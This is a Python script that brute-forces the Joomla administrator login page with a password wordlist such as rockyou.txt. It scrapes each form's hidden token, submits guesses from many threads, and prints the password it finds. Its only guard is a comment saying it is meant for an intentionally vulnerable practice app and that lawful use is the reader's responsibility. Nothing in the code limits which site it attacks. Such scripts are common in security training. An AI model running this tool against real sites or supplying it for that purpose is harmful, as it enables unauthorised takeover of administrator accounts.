#!/usr/bin/env python3

import argparse
import os
import psutil
import queue
import requests
import requests.cookies
import threading
import time

from html.parser import HTMLParser


'''
IANAL but:

At the time of writing, this website allows testing tools and manual hacking against this intentionally vulnerable app.
It is your responsibility to use this code only for good. It is your responsibility to make sure that if you run this, 
you do not break the law.

'''

parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument('-u', '--url', type=str, dest='url', default='http://0.0.0.0:8080/administrator/index.php',
                    help='your joomla target')
parser.add_argument('-w', '--wordlist', type=str, dest='wordlist',
                    default=os.path.expanduser('~/src/SecLists/Passwords/Leaked-Databases/rockyou.txt'),
                    help='wordlist to use')
parser.add_argument('-t', '--threads', type=int, dest='threads', default=psutil.cpu_count(),
                    help='number of worker threads to spawn, default is number of cores in system')
parser.add_argument('-U', '--user', type=str, dest='user', default='admin', help='user to bruteforce')
parser.add_argument('-q', '--quiet', dest='quiet', action='store_true', help='run in quiet mode')
parser.description = '''
This script will brute force passwords against Joomla.
'''
args = parser.parse_args()

# constants for stuffing the form
USERNAME_FIELD = 'username'
PASSWORD_FIELD = 'passwd'
# this text is only part of resp.text when we are redirected to admin portal, appears early in response.
SUCCESS_CHECK = 'Administration - Control Panel'


def build_terms_q(wordlist):
    terms = queue.Queue()
    # open as binary so that we don't fail on utf-8 decode, for example
    with open(wordlist, 'rb') as wordlistfd:
        for word in wordlistfd.readlines():
            try:
                # decode utf-8 ok => put in the queue
                terms.put_nowait(word.decode('utf-8').rstrip())
            except:
                # if it's not utf-8 we don't want to use it was a guess
                pass
    return terms


class Bruter:
    def __init__(self, username: str, words: queue.Queue, passwd: str = ''):
        self.username = username
        self.passwd = passwd
        self.password_q = words
        self.found = False
        print(f'finished setup for username: {self.username}')

    def run_bruteforce(self):
        for _ in range(args.threads):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        # make a session per thread to get TCP keepalive speed and implicit cookiejar
        sess = requests.Session()
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            # GET so we can fetch the token
            get_resp = sess.get(args.url)
            # inform user unless quiet mode
            if not args.quiet:
                print(f'trying: {self.username} : {brute} - approx. {self.password_q.qsize()} tries remain')
            # create parser and parse token for POST
            parser = BruteParser()
            parser.feed(get_resp.text)
            post_tags = parser.tag_results
            # stuff our params to post_tags
            post_tags[USERNAME_FIELD] = self.username
            post_tags[PASSWORD_FIELD] = brute
            # send it
            post_resp = sess.post(url=args.url, data=post_tags)
            if SUCCESS_CHECK in post_resp.text:
                self.found = True
                self.passwd = brute
                print(f'Bruteforce succeeded!')
                print(f'username: {self.username}')
                print(f'password: {self.passwd}')
                print(f'Waiting for other threads to exit...')
            # if we are here this iteration failed. clear session cookiejar before next try
            sess.cookies.clear()


class BruteParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        # print("Encountered a start tag:", tag)
        if tag == 'input':
            tag_name = None
            tag_value = None
            for name, val in attrs:
                if name == 'name':
                    tag_name = val
                if name == 'value':
                    tag_value = val

                if tag_name is not None:
                    self.tag_results[tag_name] = tag_value


def main():
    word_q = build_terms_q(args.wordlist)
    bruter = Bruter(username=args.user, words=word_q)
    bruter.run_bruteforce()


if __name__ == '__main__':
    main()
